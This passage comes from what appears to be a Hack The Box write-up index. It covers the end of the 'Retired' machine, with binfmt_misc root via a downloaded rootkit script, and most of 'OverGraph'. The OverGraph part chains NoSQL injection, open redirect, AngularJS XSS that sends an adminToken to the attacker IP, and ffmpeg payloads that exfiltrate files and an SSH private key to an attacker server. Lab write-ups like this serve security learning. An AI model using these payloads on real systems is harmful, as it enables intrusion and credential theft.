Let\u0026rsquo;s see if reg_helper.c clarifies it:\ndev@retired:~/emuemu$ cat reg_helper.c  #define _GNU_SOURCE #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int main(void) { char cmd[512] = { 0 }; read(STDIN_FILENO, cmd, sizeof(cmd)); cmd[-1] = 0; int fd = open(\"/proc/sys/fs/binfmt_misc/register\", O_WRONLY); if (-1 == fd) perror(\"open\"); if (write(fd, cmd, strnlen(cmd,sizeof(cmd))) == -1) perror(\"write\"); if (close(fd) == -1) perror(\"close\"); return 0; }  This is somewhat interesting, we should do some research on /proc/sys/fs/binfmt_misc/register. But let\u0026rsquo;s take a look at Makefile before:\ndev@retired:~/emuemu$ cat Makefile  CC := gcc CFLAGS := -std=c99 -Wall -Werror -Wextra -Wpedantic -Wconversion -Wsign-conversion SOURCES := $(wildcard *.c) TARGETS := $(SOURCES:.c=) .PHONY: install clean install: $(TARGETS) @echo \"[+] Installing program files\" install --mode 0755 emuemu /usr/bin/ mkdir --parent --mode 0755 /usr/lib/emuemu /usr/lib/binfmt.d install --mode 0750 --group dev reg_helper /usr/lib/emuemu/ setcap cap_dac_override=ep /usr/lib/emuemu/reg_helper @echo \"[+] Register OSTRICH ROMs for execution with EMUEMU\" echo ':EMUEMU:M::\\x13\\x37OSTRICH\\x00ROM\\x00::/usr/bin/emuemu:' \\ | tee /usr/lib/binfmt.d/emuemu.conf \\ | /usr/lib/emuemu/reg_helper clean: rm -f -- $(TARGETS)  Nice, we know there are binaries at /usr/bin/emuemu and /usr/lib/emuemu/reg_helper. They are the same as the ones we have seen before:\ndev@retired:~/emuemu$ md5sum /usr/bin/emuemu emuemu /usr/lib/emuemu/reg_helper reg_helper 27641ed1f6105c6f70f5167610fa0b7e /usr/bin/emuemu 27641ed1f6105c6f70f5167610fa0b7e emuemu 1600a7013d283b9aaa6b7a07f8e45b2a /usr/lib/emuemu/reg_helper 1600a7013d283b9aaa6b7a07f8e45b2a reg_helper  And we cannot modify them. Notice that the Makefile is setting a custom executable format (binfmt). It is stored in /usr/lib/binfmt.d/emuemu.conf:\ndev@retired:~/emuemu$ cat /usr/lib/binfmt.d/emuemu.conf :EMUEMU:M::\\x13\\x37OSTRICH\\x00ROM\\x00::/usr/bin/emuemu:  So every file that starts with \\x13\\x37OSTRICH\\x00ROM\\x00 will be executed with /usr/bin/emuemu. Now everything is clear:\ndev@retired:~/emuemu$ /usr/bin/emuemu EMUEMU is still under development. dev@retired:~/emuemu$ xxd test/examplerom 00000000: 1337 4f53 5452 4943 4800 524f 4d00 0a74 .7OSTRICH.ROM..t 00000010: 6869 7320 6973 2061 206d 696e 696d 616c his is a minimal 00000020: 2072 6f6d 2077 6974 6820 6120 7661 6c69 rom with a vali 00000030: 6420 6669 6c65 2074 7970 6520 7369 676e d file type sign 00000040: 6174 7572 650a ature. dev@retired:~/emuemu$ test/examplerom EMUEMU is still under development.  Because of reg_helper, we are able to create our custom executable file formats. For instance:\ndev@retired:~/emuemu$ echo ':test:M::rocky::/usr/bin/emuemu:' | /usr/lib/emuemu/reg_helper dev@retired:~/emuemu$ echo -e 'rocky\\nThis is a custom executable file'  /tmp/test dev@retired:~/emuemu$ cat /tmp/test rocky This is a custom executable file dev@retired:~/emuemu$ chmod +x /tmp/test dev@retired:~/emuemu$ /tmp/test EMUEMU is still under development.  binfmt_misc exploitation Alright, but what can we do with this feature? Well, there is an exploit for /proc/sys/fs/binfmt_misc/register when we are able to write it, and we are because reg_helper is modifying it (it has a capability CAP_DAC_OVERRIDE set). The exploit can be found here.\nWe must download the script and modify some lines. First of all, I\u0026rsquo;ll get rid of the validation that /proc/sys/fs/binfmt_misc/register is writable (we know it is). And then, we need to modify the way data is being written into the register. Hence, this line:\necho \"$binfmt_line\" \u0026gt; \"$mountpoint\"/register Becomes this one:\necho \"$binfmt_line\" | /usr/lib/emuemu/reg_helper  Finally, we download the script into the machine and run it to become root:\ndev@retired:~/emuemu$ cd /tmp dev@retired:/tmp$ wget -q 10.10.17.44/binfmt_rootkit dev@retired:/tmp$ chmod +x binfmt_rootkit dev@retired:/tmp$ ./binfmt_rootkit uid=0(root) euid=0(root) # cat /root/root.txt d8544f2779e7f65f61a1fcbe7eee471a  ","image":"/images/HTB/Retired/Retired.png","permalink":"https://7rocky.github.io/en/htb/retired/","section":"htb","summary":"Hack The Box. Linux. Medium machine. This machine has a PHP website that is vulnerable to Directory Path Traversal. There we find a PHP file that expects a file to be uploaded in order to be passed to a local socket server. We are able to enumerate open processes and download the binary that runs the server and see that it is vulnerable to Buffer Overflow. Once exploited, we can pivot to another user using symbolic links. And then, we are allowed to add custom executable formats, which can be exploited to become root. Solid binary exploitation techniques and Linux concepts are required in order to compromise this machine. This write-up contains some custom Python exploits for the foothold part","time":22,"title":"Retired"},{"contents":"  OS: Linux   Difficulty: Hard   IP Address: 10.10.11.157   Release: 30 / 04 / 2022   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.157 -p 22,80 Nmap scan report for 10.10.11.157 Host is up (0.045s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 34:a9:bf:8f:ec:b8:d7:0e:cf:8d:e6:a2:ce:67:4f:30 (RSA) | 256 45:e1:0c:64:95:17:92:82:a0:b4:35:7b:68:ac:4c:e1 (ECDSA) |_ 256 49:e7:c7:5e:6a:37:99:e5:26:ea:0e:eb:43:c4:88:59 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://graph.htb |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 7.99 seconds  This machine has ports 22 (SSH) and 80 (HTTP) open.\nWeb enumeration If we go to http://10.10.11.157 we are redirected to http://graph.htb. Hence, we must enter this domain in /etc/hosts to view the website:\nIf we inspect the source code, we can see some JavaScript code that perform a redirection if redirect is present as a query parameter. This might be useful later because it acts like an Open Redirect:\nFor the moment, let\u0026rsquo;s enumerate more subdomains using ffuf:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.11.157 -H 'Host: FUZZ.graph.htb' -fl 8 internal [Status: 200, Size: 607, Words: 36, Lines: 15, Duration: 49ms]  Alright, so let\u0026rsquo;s add internal.graph.htb into /etc/hosts and see what we have:\nWe have a login form. We can try default credentials, but they do not work. One thing to notice is that this web application is built with AngularJS. The index.html file only loads CSS and JavaScript files that will render the whole site:\nThis is a Single Page Application (SPA), so we can\u0026rsquo;t enumerate available routes the usual way (with ffuf). However, we can read the main JavaScript file (main.0681ef4e6f13e51b.js) and extract some routes from there:\n$ curl internal.graph.htb/main.0681ef4e6f13e51b.js -s | grep -oE \"['\\\"]/.*?['\\\"]\" | grep -v \"['\\\"]/*['\\\"]\" | sort -u \"/(\" \"/dashboard\" \"/g,' \"/graphql\" \"/inbox\" \"/logout\" \"/profile\" \"/register\" \"/tasks\" \"/uploads\" '/%3E%3C/g%3E%3C/g%3E%3C/svg%3E\\\" '/%3E%3Cpath d=' '/%3E%3Cpath id=' '/graphql'  So, we have:\n /dashboard /graphql /inbox /logout /profile /register /tasks /uploads  Only the three last routes work. The other ones redirect to the login form, except for /graphql which expects a GraphQL query.\nThis is /register:\nThis is /tasks:\nAnd this is /uploads:\nThat video file upload seems interesting. Maybe it will be exploitable later.\nRegistering a new account For the moment, let\u0026rsquo;s try to register a new account. We must add an email address that ends in @graph.htb:\nAnd apparently, the server sent us an email with an OTP code, but we don\u0026rsquo;t have such email address. Let\u0026rsquo;s capture the request with Burp Suite:\nAlright, we have another subdomain called internal-api.graph.htb. If we try sending some OTP codes, the server will block us after 4 attempts. So the OTP code must not be the way.\nIn fact, if we analyze the JavaScript code (previously formatted with the browser debugger), we can search for \u0026quot;register\u0026quot; and discover how to register a new account, bypassing the OTP code:\nSo we only need to send a POST request to internal-api.graph.htb/api/register with our data. Like this:\n$ curl internal-api.graph.htb/api/register -d '{\"email\":\"rocky@graph.htb\",\"username\":\"rocky\",\"password\":\"asdffdsa\",\"confirmPassword\":\"asdffdsa\"}' -H 'Content-Type: application/json' {\"result\":\"Invalid Email / Email not verified\"}  Ok, it won\u0026rsquo;t be that easy. It seems that we need to verify the email account first. Taking a look at the request in Burp Suite, we see that the OTP code is sent in a JSON document as a string:\nWe can try some injections and Type Juggling techniques. Eventually, we can try NoSQL injection payloads (taken from PayloadsAllTheThings) such as {\u0026quot;$ne\u0026quot;:\u0026quot;foo\u0026quot;}, so that we bypass the checks if the server is vulnerable:\nAnd it is vulnerable. Now we have verified the email address and can register a new account:\n$ curl internal-api.graph.htb/api/register -d '{\"email\":\"rocky@graph.htb\",\"username\":\"rocky\",\"password\":\"asdffdsa\",\"confirmPassword\":\"asdffdsa\"}' -H 'Content-Type: application/json' {\"result\":\"Account Created Please Login!\"}  At this point, we have access to /dashboard and /profile:\nMoreover, we can see a message from Mark at /inbox:\nNote: The machine restores the database every now and then, and also, the users that write messages are changing between Mark, Larry, Sally, Alen\u0026hellip; From now on, I\u0026rsquo;ll refer to other users as \u0026ldquo;Mark\u0026rdquo;.\nIf we inspect a bit more the web, we will notice that authentication is handled using JWT tokens:\nAnd also localStorage:\nFinding vulnerabilities If we modify the admin key to \u0026quot;true\u0026quot;, we will see the \u0026ldquo;Uploads\u0026rdquo; link at the left (although we already knew that the endpoint /uploads exists):\nMoreover, we know that Mark is a valid user, and indeed, if we change our username and email keys accordingly, we will enter in Mark\u0026rsquo;s session:\nThinking in the video file upload, in order to upload files to the server, we will need an adminToken:\n$ curl internal-api.graph.htb/admin/video/upload -d '' {\"result\": \"No adminToken header present\"}  As Mark\u0026rsquo;s message says, we might try to send a URL as a message and see if someone goes to that URL. The chat is a bit broken, so in order to send messages, we can click the button using the JavaScript console:\nAnother way is inspecting the request in the browser and copying it as a curl command. Something like this (the error does not matter):\n$ curl internal-api.graph.htb/graphql -d '{\"variables\":{\"to\":\"mark@graph.htb\",\"text\":\"asdf\"},\"query\":\"mutation ($to: String!, $text: String!) { sendMessage(to: $to, text: $text) { toUserName fromUserName text to from __typename } }\"}' -H 'Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYyZTcwYTI5NGUyOThkMDQzNGRkMWJkMiIsImVtYWlsIjoicm9ja3lAZ3JhcGguaHRiIiwiaWF0IjoxNjU5MzA4NTg5LCJleHAiOjE2NTkzOTQ5ODl9.ZPORWXX7amQ3DBCq4XgQES2peVoZ8NBy7Akjrc1dztc' -H 'Content-Type: application/json' {\"errors\":[{\"message\":\"Cannot read property 'length' of null\",\"locations\":[{\"line\":1,\"column\":43}],\"path\":[\"sendMessage\"],\"extensions\":{\"code\":\"INTERNAL_SERVER_ERROR\",\"exception\":{\"stacktrace\":[\"TypeError: Cannot read property 'length' of null\",\" at sendMessage (/home/user/onegraph/backend/graphql/resolvers/message.js:47:56)\",\" at processTicksAndRejections (internal/process/task_queues.js:95:5)\"]}}}],\"data\":null}  And so, we can send a message with our IP as URL, so that Mark performs a GET request (we can also test for HTML injection to see if we can get XSS easily, but it is not possible):\nAnd indeed, Mark accesses the URL and we receive the request:\n$ nc -nlvp 80 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::80 Ncat: Listening on 0.0.0.0:80 Ncat: Connection from 10.10.11.157. Ncat: Connection from 10.10.11.157:38078. GET / HTTP/1.1 Host: 10.10.17.44 Connection: keep-alive Upgrade-Insecure-Requests: 1 User-Agent: Chrome/77 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: en-US  At this point, we can think of ways to get adminToken. Assuming that adminToken is stored as a cookie or as a key in localStorage, eventually we will need to trigger Cross-Site Scripting (XSS) on the victim\u0026rsquo;s browser so that we can take the value and send it to us somehow.\nSince the web application is built with AngularJS (also known as Angular 1), it is very old and known to be vulnerable to Client-Site Template Injection (which derives in XSS).\nThe injection comes into place in the firstname and lastname. Here\u0026rsquo;s a simple proof of concept:\nAnd we can transform it to XSS using the payload below (more information in portswigger.net):\n{{constructor.constructor('alert(123)')()}}  GraphQL enumeration It\u0026rsquo;s time to enumerate the GraphQL implementation. For that purpose, we can use graphqlmap. Using an introspection query, we get the following structures:\n$ ./graphqlmap -u http://internal-api.graph.htb/graphql _____ _ ____ _ / ____| | | / __ \\| | | | __ _ __ __ _ _ __ | |__ | | | | | _ __ ___ __ _ _ __ | | |_ | '__/ _` | '_ \\| '_ \\| | | | | | '_ ` _ \\ / _` | '_ \\ | |__| | | | (_| | |_) | | | | |__| | |____| | | | | | (_| | |_) | \\_____|_| \\__,_| .__/|_| |_|\\___\\_\\______|_| |_| |_|\\__,_| .__/ | | | | |_| |_| Author: @pentest_swissky Version: 1.0 GraphQLmap \u0026gt; dump_via_introspection ============= [SCHEMA] =============== e.g: name[Type]: arg (Type!) 00: Query Messages[None]: tasks[None]: username (String!), 01: Message to[String]: from[String]: text[String]: toUserName[String]: fromUserName[String]: 03: task Assignedto[ID]: username[]: text[String]: taskstatus[String]: type[String]: 05: Mutation login[User]: email (String!), password (String!), update[User]: newusername (String!), id (ID!), firstname (String!), lastname (String!), sendMessage[Message]: to (String!), text (String!), assignTask[]: user (String!), text (String!), taskstatus (String!), type (String!), 06: User username[String]: id[ID]: email[String]: createdAt[String]: token[]: admin[String]: adminToken[]: firstname[]: lastname[]: 07: __Schema 08: __Type 11: __Field 12: __InputValue 13: __EnumValue 14: __Directive  This type of query is not a vulnerability of GraphQL, it is a feature. However, it should be disabled for security reasons because it leaks all the structure of the GraphQL implementation.\nThere are two available queries:\n Messages:  $ curl internal-api.graph.htb/graphql -d '{\"variables\":{},\"query\":\"{ Messages { toUserName fromUserName text to from __typename } }\"}' -H 'Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYyZTcwYTI5NGUyOThkMDQzNGRkMWJkMiIsImVtYWlsIjoicm9ja3lAZ3JhcGguaHRiIiwiaWF0IjoxNjU5MzA4NTg5LCJleHAiOjE2NTkzOTQ5ODl9.ZPORWXX7amQ3DBCq4XgQES2peVoZ8NBy7Akjrc1dztc' -sH 'Content-Type: application/json' | jq { \"data\": { \"Messages\": [ { \"toUserName\": \"rocky\", \"fromUserName\": \"Larry\", \"text\": \"Hey, We just realized that this email is not listed in our employee list. Can you send any links or documents so we can verify them on our end? Thanks\", \"to\": \"rocky@graph.htb\", \"from\": \"larry@graph.htb\", \"__typename\": \"Message\" }, { \"toUserName\": \"Larry\", \"fromUserName\": \"rocky\", \"text\": \"asdf\", \"to\": \"larry@graph.htb\", \"from\": \"rocky@graph.htb\", \"__typename\": \"Message\" }, ... ] } }   tasks:  $ curl internal-api.graph.htb/graphql -d '{\"variables\":{\"username\":\"rocky\"},\"query\":\"query tasks($username: String!) { tasks(username: $username) { Assignedto username text taskstatus type __typename } }\"}' -H 'Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYyZTcwYTI5NGUyOThkMDQzNGRkMWJkMiIsImVtYWlsIjoicm9ja3lAZ3JhcGguaHRiIiwiaWF0IjoxNjU5MzA4NTg5LCJleHAiOjE2NTkzOTQ5ODl9.ZPORWXX7amQ3DBCq4XgQES2peVoZ8NBy7Akjrc1dztc' -sH 'Content-Type: application/json' | jq { \"data\": { \"tasks\": [] } }  We can also modify data on the GraphQL endpoint using mutations (login, update, sendMessage and assignTask). In order to update user data, we must provide the user ID. This is our user ID, stored in the JWT token:\n$ echo eyJpZCI6IjYyZTcyNWMwNGUyOThkMDQzNGRkMWRlOSIsImVtYWlsIjoicm9ja3lfNDI4QGdyYXBoLmh0YiIsImlhdCI6MTY1OTMxNTY0OSwiZXhwIjoxNjU5NDAyMDQ5fQ== | base64 -d | jq { \"id\": \"62e725c04e298d0434dd1de9\", \"email\": \"rocky_428@graph.htb\", \"iat\": 1659315649, \"exp\": 1659402049 }  And we can query tasks set for Mark to get his ID (key Assignedto):\n$ curl internal-api.graph.htb/graphql -d '{\"variables\":{\"username\":\"Mark\"},\"query\":\"query tasks($username: String!) { tasks(username: $username) { Assignedto username text taskstatus type __typename } }\"}' -H 'Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYyZTcwYTI5NGUyOThkMDQzNGRkMWJkMiIsImVtYWlsIjoicm9ja3lAZ3JhcGguaHRiIiwiaWF0IjoxNjU5MzA4NTg5LCJleHAiOjE2NTkzOTQ5ODl9.ZPORWXX7amQ3DBCq4XgQES2peVoZ8NBy7Akjrc1dztc' -sH 'Content-Type: application/json' | jq { \"data\": { \"tasks\": [ { \"Assignedto\": \"62e725911b49ab0b7ac8372a\", \"username\": null, \"text\": \"Lorem ipsum\", \"taskstatus\": \"completed\", \"type\": \"development\" } ] } }  Exploit to get adminToken Let\u0026rsquo;s plan the exploit strategy:\n The final objective is to get adminToken from Mark, which is likely to be stored in localStorage Hence, only the user (Mark) can access it if he is at internal.graph.htb (localStorage only is accessible by the same site where it was set) Therefore, the way to access localStorage must be XSS (from the AngularJS Client-Side Template Injection present in firstname and lastname) In order to change the victim user\u0026rsquo;s firstname, he must update his profile using a GraphQL mutation (update) providing his user ID We can get the victim user\u0026rsquo;s ID with a GraphQL query (tasks)  Alright, so we must figure out how to force the victim user to update his profile.\nHere we must recall the Open Redirect vulnerability in http://graph.htb/?redirect=. We can use it to point to our attacker machine and load a malicious JavaScript code that performs the update mutation. But this won\u0026rsquo;t work since the server also requires que auth cookie with a valid JWT token, and it has httpOnly set to true (so we can\u0026rsquo;t access cookies from JavaScript).\nTherefore, the mutation must be performed from the same http://graph.htb site, so that cookies flow with the request. And this can be achieved running inline JavaScript. For example:\nhttp://graph.htb/?redirect=javascript:eval('alert(123)')  So we have the way to tell the user to update his profile (Cross-Site Request Forgery). We only have to send the URL with the malicious inline JavaScript code to perform the mutation in the chat. And this mutation will contain the AngularJS XSS payload in the firstname field, so that we can access localStorage and retrieve adminToken.\nIn order to pass a large JavaScript code as inline, we can encode it in Base64 and then use javascript:eval(atob`\u0026lt;base64-data\u0026gt;`) (it is important that no padding = appears).\nThis will be the code to trick the victim user to perform the update GraphQL mutation:\nfetch('http://internal-api.graph.htb/graphql', { method: 'POST', credentials: 'include', mode: 'no-cors', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ variables: { newusername: 'Mark', id: '\u0026lt;id\u0026gt;', firstname: `\u0026lt;AngularJS XSS\u0026gt;`, lastname: 'asdf' }, query: ` mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) { update(newusername: $newusername, id: $id, firstname: $firstname, lastname: $lastname) { __typename } } ` }) })  And the AngularJS XSS payload will be:\n{{constructor.constructor('fetch(\"http://10.10.17.44/\" + localStorage.getItem(\"adminToken\"))')()}}  So, I decided to automate everything in a Python script called get_admin_token.py to test everything and chain all the web exploitation techniques (detailed explanation here). In the end, we will get a valid adminToken:\n$ python3 get_admin_token.py [+] Logged in as rocky (password: asdffdsa) [*] JWT token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYyZTdhNmRmNGUyOThkMDQzNGRkMWZjMyIsImVtYWlsIjoicm9ja3lAZ3JhcGguaHRiIiwiaWF0IjoxNjU5MzQ5MTMwLCJleHAiOjE2NTk0MzU1MzB9.buvUeGkubEoMwDRN-aoH28l2ynIVjdX1HXInWK4mPrM [*] Own user ID: 62e7a6df4e298d0434dd1fc3 [+] Victim's ID: 62e7a42181fe151459e90ea6 [+] Trying to bind to :: on port 80: Done [+] Waiting for connections on :::80: Got connection from ::ffff:10.10.11.157 on port 34196 [*] Closed connection to ::ffff:10.10.11.157 port 34196 [+] adminToken: c0b9db4c8e4bbb24d59a3aaffa8c8b83  Now we can set this token in localStorage and use the video file upload utility:\nExploiting the video file upload At this point we might guess that the server uses ffmpeg to process the video file. There are some vulnerabilities regarding Server-Side Request Forgery and Local File Read (more information in hackerone.com and PayloadsAllTheThings).\nIn order to read files from the server (according to the hackerone.com report), we must have a file called header.m3u8 like this:\n#EXTM3U #EXT-X-MEDIA-SEQUENCE:0 #EXTINF:, http://10.10.17.44?  And no new line character at the end. And we need to upload a file called video.avi (for example), with the following text:\n#EXTM3U #EXT-X-MEDIA-SEQUENCE:0 #EXTINF:10.0, concat:http://10.10.17.44/header.m3u8|file:///etc/passwd #EXT-X-ENDLIST  The above payload will send us the first line of the /etc/passwd file from the machine if using an HTTP server:\n$ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ... ::ffff:10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - ::ffff:10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - ::ffff:10.10.11.157 - - [] \"GET ?root:x:0:0:root:/root:/bin/bash HTTP/1.1\" 301 - ::ffff:10.10.11.157 - - [] \"GET ?root:x:0:0:root:/?root:x:0:0:root:/root:/bin/bash HTTP/1.1\" 301 - ...  In order to get more data, we must change the video.avi a little bit:\n#EXTM3U #EXT-X-MEDIA-SEQUENCE:0 #EXTINF:10.0, concat:http://10.10.17.44/header.m3u8|subfile,,start,1,end,10000,,:/etc/passwd #EXT-X-ENDLIST  With the above payload, we will be receiving bytes until a new line character, so we will be updating the start offset accordingly to retrieve all lines.\nWhen having a Local File Read vulnerability, we might check for source code and SSH private keys. Instead of extracting the whole /etc/passwd file to obtain a system user, we can crash the web server and see a stack trace that leaks a path:\n$ curl internal-api.graph.htb/api/register -d '{' -H 'Content-Type: application/json' \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\"en\"\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\"utf-8\"\u0026gt; \u0026lt;title\u0026gt;Error\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;pre\u0026gt;SyntaxError: Unexpected end of JSON input\u0026lt;br\u0026gt; at JSON.parse (\u0026lt;anonymous\u0026gt;)\u0026lt;br\u0026gt; at parse (/home/user/onegraph/backend/node_modules/body-parser/lib/types/json.js:89:19)\u0026lt;br\u0026gt; at /home/user/onegraph/backend/node_modules/body-parser/lib/read.js:121:18\u0026lt;br\u0026gt; at invokeCallback (/home/user/onegraph/backend/node_modules/raw-body/index.js:224:16)\u0026lt;br\u0026gt; at done (/home/user/onegraph/backend/node_modules/raw-body/index.js:213:7)\u0026lt;br\u0026gt; at IncomingMessage.onEnd (/home/user/onegraph/backend/node_modules/raw-body/index.js:273:7)\u0026lt;br\u0026gt; at IncomingMessage.emit (events.js:412:35)\u0026lt;br\u0026gt; at endReadableNT (internal/streams/readable.js:1334:12)\u0026lt;br\u0026gt; at processTicksAndRejections (internal/process/task_queues.js:82:21)\u0026lt;/pre\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; $ curl internal-api.graph.htb/api/register -d '{' -sH 'Content-Type: application/json' | grep -oE '/home.*?:' /home/user/onegraph/backend/node_modules/body-parser/lib/types/json.js: /home/user/onegraph/backend/node_modules/body-parser/lib/read.js: /home/user/onegraph/backend/node_modules/raw-body/index.js: /home/user/onegraph/backend/node_modules/raw-body/index.js: /home/user/onegraph/backend/node_modules/raw-body/index.js:  So user is a valid user. At this point, we can retrieve the user.txt flag using the video file upload:\n$ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ... ::ffff:10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - ::ffff:10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - ::ffff:10.10.11.157 - - [] \"GET ?09753d50eb14c51fc58b94afb5eedcc3 HTTP/1.1\" 301 - ::ffff:10.10.11.157 - - [] \"GET ?09753d50eb14c51fc58b94afb5eedcc3/?09753d50eb14c51fc58b94afb5eedcc3 HTTP/1.1\" 301 - ...  In order to access the machine, we will need to extract /home/user/.ssh/id_rsa:\n$ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ... ::ffff:10.10.11.157 - - [01/Aug/2022 14:19:39] \"GET /header.m3u8 HTTP/1.1\" 200 - ::ffff:10.10.11.157 - - [01/Aug/2022 14:19:39] \"GET /header.m3u8 HTTP/1.1\" 200 - ::ffff:10.10.11.157 - - [01/Aug/2022 14:19:40] code 400, message Bad request syntax ('GET ?-----BEGIN OPENSSH PRIVATE KEY----- HTTP/1.1') ::ffff:10.10.11.157 - - [01/Aug/2022 14:19:40] \"GET ?-----BEGIN OPENSSH PRIVATE KEY----- HTTP/1.1\" 400 -  Since it will be very tedious to extract the whole file manually, it is better to use a Python script to automate it: extract_id_rsa.py (detailed explanation here):\n$ python3 extract_file.py 10.10.17.44 c0b9db4c8e4bbb24d59a3aaffa8c8b83 * Serving Flask app 'extract_file' (lazy loading) * Environment: production WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Debug mode: on * Running on all addresses (0.0.0.0) WARNING: This is a development server. Do not use it in a production deployment. * Running on http://0.0.0.0:80 (Press CTRL+C to quit) * Restarting with stat * Debugger is active! * Debugger PIN: XXX-XXX-XXX 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /?d=b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /?d=QyNTUxOQAAACAvdFWzL7vVSn9cH6fgB3Sgtt2OG4XRGYh5ugf8FLAYDAAAAJjebJ3U3myd HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /?d=1AAAAAtzc2gtZWQyNTUxOQAAACAvdFWzL7vVSn9cH6fgB3Sgtt2OG4XRGYh5ugf8FLAYDA HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /?d=AAAEDzdpSxHTz6JXGQhbQsRsDbZoJ+8d3FI5MZ1SJ4NGmdYC90VbMvu9VKf1wfp+AHdKC2 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /?d=3Y4bhdEZiHm6B/wUsBgMAAAADnVzZXJAb3ZlcmdyYXBoAQIDBAUGBw== HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] code 400, message Bad request syntax ('GET /?d=-----END OPENSSH PRIVATE KEY----- HTTP/1.1') 10.10.11.157 - - [] \"GET /?d=-----END OPENSSH PRIVATE KEY----- HTTP/1.1\" HTTPStatus.BAD_REQUEST - ^C $ cat id_rsa -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW QyNTUxOQAAACAvdFWzL7vVSn9cH6fgB3Sgtt2OG4XRGYh5ugf8FLAYDAAAAJjebJ3U3myd 1AAAAAtzc2gtZWQyNTUxOQAAACAvdFWzL7vVSn9cH6fgB3Sgtt2OG4XRGYh5ugf8FLAYDA AAAEDzdpSxHTz6JXGQhbQsRsDbZoJ+8d3FI5MZ1SJ4NGmdYC90VbMvu9VKf1wfp+AHdKC2 3Y4bhdEZiHm6B/wUsBgMAAAADnVzZXJAb3ZlcmdyYXBoAQIDBAUGBw== -----END OPENSSH PRIVATE KEY-----  System enumeration Now we can access the machine via SSH:\n$ chmod 600 id_rsa $ ssh -i id_rsa user@10.10.11.157 user@overgraph:~$ cat user.txt 09753d50eb14c51fc58b94afb5eedcc3  When analyzing processes in execution running as root, we see a weird one:\nuser@overgraph:~$ ps -faux | grep root ... root 8623 0.0 0.0 0 0 ? I 14:41 0:00 \\_ [kworker/0:2-events] root 8656 0.0 0.0 0 0 ? I 14:45 0:00 \\_ [kworker/u256:0-events_power_efficient] root 1 0.0 0.2 103796 11208 ? Ss Jul31 0:04 /sbin/init maybe-ubiquity root 491 0.0 0.4 67848 16268 ? S\u0026lt;s Jul31 0:01 /lib/systemd/systemd-journald root 517 0.0 0.1 21368 5436 ? Ss Jul31 0:01 